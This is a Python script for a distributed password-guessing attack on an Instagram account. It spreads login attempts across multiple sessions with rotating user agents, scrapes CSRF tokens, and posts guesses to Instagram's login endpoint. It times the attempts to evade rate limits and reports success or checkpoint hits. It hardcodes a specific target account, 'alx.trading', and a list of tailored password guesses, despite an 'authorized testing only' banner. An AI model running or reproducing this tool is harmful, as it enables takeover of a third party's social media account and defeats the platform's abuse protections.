#!/usr/bin/env python3
"""
🌐 DISTRIBUTED ATTACK ORCHESTRATOR 🌐
====================================

Advanced distributed Instagram attack system
ใช้ multiple sessions, IPs, และ coordinated timing

⚠️ FOR EDUCATIONAL/AUTHORIZED TESTING ONLY ⚠️
"""

import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import List, Dict, Optional
import subprocess


@dataclass
class AttackNode:
    """Node สำหรับ distributed attack"""
    id: int
    session: Optional[aiohttp.ClientSession]
    proxy: Optional[str]
    user_agent: str
    csrf_token: Optional[str]
    last_attempt: Optional[datetime]
    attempts_count: int
    success_count: int
    rate_limited: bool
    cooldown_until: Optional[datetime]


class DistributedAttackOrchestrator:
    """Orchestrator สำหรับ distributed attack"""
    
    def __init__(self, target_username: str, num_nodes: int = 5):
        self.target = target_username
        self.num_nodes = num_nodes
        self.nodes: List[AttackNode] = []
        self.password_queue = asyncio.Queue()
        self.results_queue = asyncio.Queue()
        self.attack_active = False
        self.total_attempts = 0
        self.successful_logins = 0
        self.checkpoint_triggers = 0
        
        print(f"🌐 DISTRIBUTED ATTACK ORCHESTRATOR")
        print(f"🎯 Target: {target_username}")
        print(f"🔢 Nodes: {num_nodes}")
        print(f"⚡ Mode: Coordinated Attack")
    
    def generate_user_agents(self) -> List[str]:
        """สร้าง User Agent pool"""
        uas = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Mobile/119.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Instagram 302.0.0.23.108 (iPhone14,2; iOS 16.6.1; Scale/3.00)",
            "Instagram 302.0.0.27.111 (SM-G998B; Android 13; Scale/2.75)",
            "Instagram 302.0.0.27.111 (Pixel 7; Android 14; Scale/2.625)"
        ]
        return uas
    
    async def initialize_nodes(self):
        """เริ่มต้น attack nodes"""
        print("🔧 Initializing attack nodes...")
        
        user_agents = self.generate_user_agents()
        
        for i in range(self.num_nodes):
            # Create node
            node = AttackNode(
                id=i + 1,
                session=None,
                proxy=None,
                user_agent=random.choice(user_agents),
                csrf_token=None,
                last_attempt=None,
                attempts_count=0,
                success_count=0,
                rate_limited=False,
                cooldown_until=None
            )
            
            # Create session with unique characteristics
            connector = aiohttp.TCPConnector(
                limit=5,
                limit_per_host=2,
                keepalive_timeout=30 + random.randint(5, 15),
                enable_cleanup_closed=True,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(
                total=30 + random.randint(5, 15),
                connect=10 + random.randint(2, 8)
            )
            
            node.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={"User-Agent": node.user_agent}
            )
            
            self.nodes.append(node)
            
            print(f"✅ Node #{node.id} initialized")
            await asyncio.sleep(random.uniform(1, 3))  # Stagger initialization
        
        print(f"🌐 {len(self.nodes)} nodes ready for distributed attack")
    
    async def get_csrf_token(self, node: AttackNode) -> Optional[str]:
        """ดึง CSRF token สำหรับ node"""
        try:
            async with node.session.get(
                "https://www.instagram.com/accounts/login/",
                headers={"User-Agent": node.user_agent}
            ) as response:
                
                if response.status == 200:
                    content = await response.text()
                    
                    import re
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
                    if csrf_match:
                        token = csrf_match.group(1)
                        node.csrf_token = token
                        print(f"🔑 Node #{node.id} got CSRF: {token[:10]}...")
                        return token
                
        except Exception as e:
            print(f"❌ Node #{node.id} CSRF error: {e}")
        
        return None
    
    async def node_attack_worker(self, node: AttackNode):
        """Worker function สำหรับแต่ละ node"""
        print(f"🚀 Node #{node.id} attack worker started")
        
        while self.attack_active:
            try:
                # Check cooldown
                if node.cooldown_until and datetime.now() < node.cooldown_until:
                    await asyncio.sleep(1)
                    continue
                
                # Get password from queue
                try:
                    password = await asyncio.wait_for(
                        self.password_queue.get(), timeout=1.0
                    )
                except asyncio.TimeoutError:
                    await asyncio.sleep(1)
                    continue
                
                # Ensure we have CSRF token
                if not node.csrf_token:
                    await self.get_csrf_token(node)
                    if not node.csrf_token:
                        # Put password back and try again later
                        await self.password_queue.put(password)
                        await asyncio.sleep(5)
                        continue
                
                # Perform attack
                result = await self.perform_node_attack(node, password)
                
                # Store result
                await self.results_queue.put({
                    "node_id": node.id,
                    "password": password,
                    "result": result,
                    "timestamp": datetime.now()
                })
                
                # Update node stats
                node.attempts_count += 1
                node.last_attempt = datetime.now()
                
                if result.get("success"):
                    node.success_count += 1
                    self.successful_logins += 1
                
                if result.get("checkpoint"):
                    self.checkpoint_triggers += 1
                
                # Handle rate limiting
                if result.get("rate_limited"):
                    node.rate_limited = True
                    # Cooldown for 5-15 minutes
                    cooldown_minutes = random.randint(5, 15)
                    node.cooldown_until = datetime.now() + timedelta(
                        minutes=cooldown_minutes
                    )
                    print(f"🚨 Node #{node.id} rate limited - "
                          f"cooldown {cooldown_minutes}m")
                
                # Coordinated delay
                base_delay = random.uniform(30, 90)  # 30-90 seconds
                
                # Add jitter based on node ID
                jitter = (node.id - 1) * random.uniform(5, 15)
                
                final_delay = base_delay + jitter
                
                print(f"⏰ Node #{node.id} delay: {final_delay:.1f}s")
                await asyncio.sleep(final_delay)
                
            except Exception as e:
                print(f"💥 Node #{node.id} worker error: {e}")
                await asyncio.sleep(10)
        
        print(f"🛑 Node #{node.id} worker stopped")
    
    async def perform_node_attack(self, node: AttackNode, password: str):
        """ทำการโจมตีจาก node"""
        
        print(f"🎯 Node #{node.id} attacking with: {password}")
        
        # Create login payload
        payload = {
            "username": self.target,
            "password": password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}",
        }
        
        # Create headers
        headers = {
            "User-Agent": node.user_agent,
            "X-CSRFToken": node.csrf_token,
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        try:
            async with node.session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=payload,
                headers=headers
            ) as response:
                
                response_text = await response.text()
                
                result = {
                    "status_code": response.status,
                    "response": response_text,
                    "success": False,
                    "checkpoint": False,
                    "rate_limited": False,
                    "account_exists": False
                }
                
                if response.status == 200:
                    try:
                        data = json.loads(response_text)
                        
                        if data.get("authenticated"):
                            result["success"] = True
                            print(f"🎉 Node #{node.id} SUCCESS! {password}")
                        
                        elif "checkpoint" in response_text.lower():
                            result["checkpoint"] = True
                            result["account_exists"] = True
                            print(f"🔒 Node #{node.id} CHECKPOINT! {password}")
                        
                        elif "incorrect" in response_text.lower():
                            result["account_exists"] = True
                            print(f"❌ Node #{node.id} wrong password")
                        
                    except json.JSONDecodeError:
                        if "login" in response_text.lower():
                            result["account_exists"] = True
                
                elif response.status == 429:
                    result["rate_limited"] = True
                    print(f"🚨 Node #{node.id} rate limited")
                
                self.total_attempts += 1
                return result
                
        except Exception as e:
            print(f"❌ Node #{node.id} attack error: {e}")
            return {"error": str(e)}
    
    async def load_password_queue(self, passwords: List[str]):
        """โหลดรหัสผ่านเข้า queue"""
        print(f"📝 Loading {len(passwords)} passwords into queue...")
        
        for password in passwords:
            await self.password_queue.put(password)
        
        print(f"✅ {len(passwords)} passwords loaded")
    
    async def results_monitor(self):
        """Monitor และแสดงผลลัพธ์"""
        print("📊 Results monitor started")
        
        while self.attack_active:
            try:
                result = await asyncio.wait_for(
                    self.results_queue.get(), timeout=1.0
                )
                
                # Process result
                node_id = result["node_id"]
                password = result["password"]
                res = result["result"]
                timestamp = result["timestamp"]
                
                # Print summary
                if res.get("success"):
                    print(f"\n🎉 SUCCESS FOUND!")
                    print(f"   Node: #{node_id}")
                    print(f"   Password: {password}")
                    print(f"   Time: {timestamp}")
                    
                    # Stop attack
                    self.attack_active = False
                    
                elif res.get("checkpoint"):
                    print(f"\n🔒 CHECKPOINT (High Value)")
                    print(f"   Node: #{node_id}")
                    print(f"   Password: {password}")
                
            except asyncio.TimeoutError:
                # Print periodic status
                active_nodes = sum(
                    1 for node in self.nodes 
                    if not node.rate_limited
                )
                
                print(f"📈 Status - Attempts: {self.total_attempts}, "
                      f"Active Nodes: {active_nodes}/{len(self.nodes)}, "
                      f"Checkpoints: {self.checkpoint_triggers}")
                
                await asyncio.sleep(30)  # Status every 30s
            
            except Exception as e:
                print(f"❌ Monitor error: {e}")
        
        print("📊 Results monitor stopped")
    
    async def run_distributed_attack(self, passwords: List[str]):
        """เรียกใช้ distributed attack"""
        print("\n🌐 STARTING DISTRIBUTED ATTACK")
        print("=" * 60)
        
        # Initialize nodes
        await self.initialize_nodes()
        
        # Load passwords
        await self.load_password_queue(passwords)
        
        # Start attack
        self.attack_active = True
        
        # Create tasks
        tasks = []
        
        # Node workers
        for node in self.nodes:
            task = asyncio.create_task(self.node_attack_worker(node))
            tasks.append(task)
        
        # Results monitor
        monitor_task = asyncio.create_task(self.results_monitor())
        tasks.append(monitor_task)
        
        try:
            # Wait for completion or interruption
            await asyncio.gather(*tasks)
            
        except KeyboardInterrupt:
            print("\n⚠️ Attack interrupted by user")
            self.attack_active = False
            
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
            # Wait for cleanup
            await asyncio.gather(*tasks, return_exceptions=True)
        
        finally:
            # Cleanup sessions
            for node in self.nodes:
                if node.session:
                    await node.session.close()
        
        # Final stats
        print("\n" + "=" * 60)
        print("📊 DISTRIBUTED ATTACK COMPLETED")
        print("=" * 60)
        print(f"🎯 Target: {self.target}")
        print(f"🔢 Total attempts: {self.total_attempts}")
        print(f"🌐 Nodes used: {len(self.nodes)}")
        print(f"🎉 Successful logins: {self.successful_logins}")
        print(f"🔒 Checkpoint triggers: {self.checkpoint_triggers}")
        
        # Node statistics
        print(f"\n📈 NODE STATISTICS:")
        for node in self.nodes:
            status = "🔴 Rate Limited" if node.rate_limited else "🟢 Active"
            print(f"   Node #{node.id}: {node.attempts_count} attempts, "
                  f"{node.success_count} success - {status}")


def load_priority_passwords():
    """โหลดรหัสผ่าน priority"""
    try:
        with open('/workspaces/sugarglitch-realops/priority_passwords.txt',
                  'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords[:30]  # ใช้ 30 ตัวแรก
    except Exception:
        # Fallback passwords
        return [
            "4l3x.7r4dlng2025",
            "4l3x7r4dlng2025",
            "Alex.Trading2025",
            "alex.trading2025",
            "AlxTrading2025",
            "4L3X.7R4DLNG2025",
            "4l3x_7r4dlng2025",
            "4l3x-7r4dlng2025",
            "4l3x.7r4dlng2024",
            "4l3x.7r4dlng!",
            "alx.trading2025",
            "AlxTrading!",
            "4l3x123",
            "Trading2025",
            "Alex123"
        ]


async def main():
    """Main distributed attack function"""
    
    print("🌐 DISTRIBUTED INSTAGRAM ATTACK ORCHESTRATOR 🌐")
    print("=" * 60)
    print("⚠️  FOR AUTHORIZED TESTING ONLY")
    print("🎯 Target: alx.trading")
    print("🌐 Mode: Distributed Coordinated Attack")
    print("=" * 60)
    
    # Configuration
    num_nodes = 3  # Start with 3 nodes
    target = "alx.trading"
    
    # ยืนยันการใช้งาน
    confirm = input(f"\n⚠️ Start distributed attack with {num_nodes} nodes? "
                   "(y/N): ")
    if confirm.lower() != 'y':
        print("❌ Attack cancelled")
        return
    
    # โหลดรหัสผ่าน
    passwords = load_priority_passwords()
    print(f"🔑 Loaded {len(passwords)} priority passwords")
    
    # เริ่ม distributed attack
    orchestrator = DistributedAttackOrchestrator(target, num_nodes)
    
    await orchestrator.run_distributed_attack(passwords)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️ Distributed attack interrupted")
    except Exception as e:
        print(f"\n💥 Distributed attack error: {e}")
